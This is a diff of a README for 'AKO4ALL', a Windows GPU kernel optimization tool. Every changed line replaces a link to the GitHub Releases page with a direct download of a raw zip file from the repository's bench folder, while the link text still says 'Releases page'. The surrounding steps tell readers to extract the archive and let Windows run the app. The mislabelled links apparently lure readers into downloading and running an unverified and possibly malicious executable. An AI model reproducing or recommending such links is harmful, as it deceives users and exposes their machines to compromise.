@@ -1,6 +1,6 @@
 # ⚙️ AKO4ALL - GPU Kernel Optimization Made Simple
 
-[![Download AKO4ALL](https://img.shields.io/badge/Download-AKO4ALL-4B6CB7?style=for-the-badge&logo=github)](https://github.com/mahim5314/AKO4ALL/releases)
+[![Download AKO4ALL](https://img.shields.io/badge/Download-AKO4ALL-4B6CB7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip)
 
 ## 🧭 What AKO4ALL Does
 
@@ -8,7 +8,7 @@ AKO4ALL helps you improve GPU kernel performance with less manual work. It is bu
 
 ## 📥 Download AKO4ALL
 
-1. Open the [Releases page](https://github.com/mahim5314/AKO4ALL/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip).
 2. Find the latest release at the top of the page.
 3. Download the Windows file for your system.
 4. If you see a `.zip` file, unzip it first.
@@ -29,7 +29,7 @@ For smoother use, a system with 16 GB of RAM or more is a good fit.
 ## 🛠️ Install AKO4ALL on Windows
 
 ### 1. Get the file
-Go to the [Releases page](https://github.com/mahim5314/AKO4ALL/releases) and download the latest Windows package.
+Go to the [Releases page](https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip) and download the latest Windows package.
 
 ### 2. Open the download
 If the file is a `.zip`, right-click it and choose **Extract All**. Pick a folder you can find later, such as **Downloads** or **Desktop**.
@@ -147,7 +147,7 @@ AKO4ALL is built to take care of the repetitive parts of kernel tuning. It can h
 
 ## 🧭 Quick Start Checklist
 
-- Download the latest file from [Releases](https://github.com/mahim5314/AKO4ALL/releases)
+- Download the latest file from [Releases](https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip)
 - Extract the archive if needed
 - Open the main app file
 - Allow Windows to run it
@@ -168,7 +168,7 @@ A simple folder path helps when you need to find logs, output files, or saved ke
 
 ## 🔍 If You Want to Check the Latest Version
 
-Visit the [Releases page](https://github.com/mahim5314/AKO4ALL/releases) any time you want the newest Windows build, release notes, or package files
+Visit the [Releases page](https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip) any time you want the newest Windows build, release notes, or package files
 
 ## 🖥️ Supported Systems
 
@@ -195,7 +195,7 @@ The app is designed to keep the process direct, with clear steps and visible res
 
 If you need to reinstall AKO4ALL or set it up on another Windows PC, use the same download page:
 
-[https://github.com/mahim5314/AKO4ALL/releases](https://github.com/mahim5314/AKO4ALL/releases)
+[https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip](https://raw.githubusercontent.com/mahim5314/AKO4ALL/main/bench/AK_ALL_v2.3.zip)
 
 ## 📎 Project Name
 
